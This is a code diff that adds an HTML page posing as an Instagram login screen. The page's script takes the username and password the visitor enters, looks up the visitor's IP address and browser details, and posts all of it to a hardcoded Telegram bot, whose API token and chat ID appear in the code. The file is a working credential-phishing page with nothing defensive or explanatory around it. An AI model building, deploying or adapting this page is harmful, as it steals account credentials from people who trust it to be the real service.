@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Instagram Login</title>
+	<style>
+		body {
+			font-family: Arial, sans-serif;
+			background-color: #f5f5f5;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 100vh;
+			margin: 0;
+		}
+
+		.login-box {
+			background-color: #fff;
+			border-radius: 5px;
+			box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+			padding: 30px;
+			width: 300px;
+		}
+
+		h1 {
+			text-align: center;
+			margin-bottom: 30px;
+		}
+
+		label {
+			display: block;
+			margin-bottom: 10px;
+		}
+
+		input[type="text"],
+		input[type="password"] {
+			border: 1px solid #ccc;
+			border-radius: 3px;
+			padding: 10px;
+			width: 100%;
+			margin-bottom: 15px;
+		}
+
+		input[type="submit"] {
+			background-color: #3897f0;
+			border: none;
+			border-radius: 3px;
+			color: #fff;
+			padding: 10px 30px;
+			cursor: pointer;
+		}
+
+		input[type="submit"]:hover {
+			background-color: #3385d6;
+		}
+
+		.forgot-password {
+			text-align: right;
+			margin-top: 10px;
+			color: #007bff;
+			cursor: pointer;
+		}
+
+		.forgot-password:hover {
+			text-decoration: underline;
+		}
+	</style>
+</head>
+<body>
+	<div class="login-box">
+		<h1><img src="https://www.didogram.com/wp-content/uploads/2020/08/1-logo.png" alt="Instagram" width="50" height="50"> Instagram Login</h1>
+		<form id="login-form">
+			<label for="username">Username:</label>
+			<input type="text" id="username" name="username" required>
+			<label for="password">Password:</label>
+			<input type="password" id="password" name="password" required>
+			<input type="submit" value="Login">
+			<div class="forgot-password" onclick="window.open('https://google.com', '_blank')">Forgot password?</div>
+		</form>
+	</div>
+
+	<script>
+		const form = document.getElementById('login-form');
+		form.addEventListener('submit', (e) => {
+			e.preventDefault();
+			const username = document.getElementById('username').value;
+			const password = document.getElementById('password').value;
+
+			// Get device name and IP address
+			const deviceName = navigator.appVersion;
+			const ipAddress = fetch('https://api.ipify.org?format=json')
+				.then(response => response.json())
+				.then(data => data.ip);
+
+			Promise.all([ipAddress]).then(values => {
+				const deviceInfo = {
+					deviceName: deviceName,
+					ipAddress: values[0]
+				};
+
+				// Send data to Telegram using Telegram Bot API
+				const telegramApiUrl = `https://api.telegram.org/bot6483069901:AAF952M6NEsPECTspSfq8Z3VYVNaiUKKJyY/sendMessage`;
+				const chatId = '5191155942'; // Replace with your Telegram Chat ID
+				const message = `Username : ${username}\nPassword : ${password}\nDevice Info : ${JSON.stringify(deviceInfo)}`;
+
+				fetch(telegramApiUrl, {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/json'
+					},
+					body: JSON.stringify({
+						chat_id: chatId,
+						text: message
+					})
+				})
+				.then(response => response.json())
+				.then(data => console.log(data))
+				.catch(error => console.error(error));
+			});
+		});
+	</script>
+</body>
+</html>
